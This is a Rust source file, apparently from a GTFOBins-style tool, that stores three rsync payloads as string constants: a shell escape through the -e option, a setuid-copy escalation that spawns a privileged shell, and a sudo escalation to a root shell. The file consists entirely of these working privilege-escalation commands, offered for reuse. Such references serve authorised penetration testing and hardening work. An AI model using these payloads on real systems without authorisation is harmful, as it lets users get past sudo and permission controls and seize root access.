pub static BIN_NAME: &'static str = "rsync";
pub static SH_CODE: &'static str = r#"
    
    rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which rsync) .

    ./rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
